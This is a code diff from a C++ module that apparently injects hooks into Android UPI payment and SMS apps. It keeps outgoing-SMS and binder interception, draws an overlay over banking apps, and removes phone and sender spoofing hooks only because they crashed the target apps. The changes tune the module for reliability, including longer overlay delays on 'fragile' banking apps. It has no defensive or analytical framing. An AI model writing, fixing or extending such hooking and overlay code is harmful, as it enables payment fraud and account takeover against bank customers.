@@ -253,19 +253,12 @@ public:
         std::string sms_st = outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
         report_line(api_, std::string("HOOK|") + sms_st);
 
-        // Messages: ONLY ISms/Intent hooks — phone/sender spoof crash risk on A11-16
+        // SAFE MODE: no phone/sender JNI hooks — telephony spoof crashes UPI on open (A11-16)
         const bool is_msg = (pkg_.find("messaging") != std::string::npos) ||
                             (pkg_.find(".mms") != std::string::npos) ||
                             (pkg_ == "com.android.mms") || (pkg_ == "com.oneplus.mms") ||
                             (pkg_ == "com.coloros.mms") || (pkg_ == "com.samsung.android.messaging");
-        if (!is_msg) {
-            phone_number_hook::install(env_, api_, pkg_.c_str());
-            report_line(api_, "phone_hook:" + pkg_);
-            sender_spoof::install(env_, api_, pkg_.c_str());
-            report_line(api_, "sender_hook:" + pkg_);
-        } else {
-            report_line(api_, "msg_isms_only:" + pkg_);
-        }
+        report_line(api_, is_msg ? ("safe_msg:" + pkg_) : ("safe_upi:" + pkg_));
 
         keep_ = true;
     }
@@ -281,18 +274,14 @@ public:
             return;
         }
 
-        // Soft re-assert hooks + Intent PLT (libandroid_runtime ab loaded hota hai)
+        // Soft re-assert SMS hooks only (no phone/sender — crash-safe)
         outgoing_sms_hook::install_for_upi(env_, api_, pkg_.c_str());
+        outgoing_sms_hook::install_binder_plt_force(api_);
+
         const bool is_msg = (pkg_.find("messaging") != std::string::npos) ||
                             (pkg_.find(".mms") != std::string::npos) ||
                             (pkg_ == "com.android.mms") || (pkg_ == "com.oneplus.mms") ||
                             (pkg_ == "com.coloros.mms") || (pkg_ == "com.samsung.android.messaging");
-        if (!is_msg) {
-            phone_number_hook::install(env_, api_, pkg_.c_str());
-            sender_spoof::install(env_, api_, pkg_.c_str());
-        }
-        // Force Intent PLT retry in post (pre me lib maps miss → intent=0)
-        outgoing_sms_hook::install_binder_plt_force(api_);
 
         mark_active();
         {
@@ -306,16 +295,17 @@ public:
             mkdir(base.c_str(), 0700);
             FILE* sf = fopen((base + "/post_hooks.txt").c_str(), "w");
             if (sf) {
-                fprintf(sf, "post_ok:%s\n", pkg_.c_str());
+                fprintf(sf, "post_ok_safe:%s\n", pkg_.c_str());
                 fclose(sf);
             }
         }
 
-        // Overlay only for UPI (not Messages app)
+        // Overlay: delay longer on fragile apps; skip Messages
         if (native_overlay_wanted() && !is_msg) {
             const bool fragile = upi_registry::is_fragile_banking_app(pkg_);
             const bool yespay = is_yespay(pkg_);
-            const int ov = yespay ? 2 : (fragile ? 2 : 1);
+            // Longer delay = fewer startup races/crashes
+            const int ov = yespay ? 4 : (fragile ? 3 : 2);
             schedule_overlay_ui(env_, api_, pkg_, ov);
         }
 
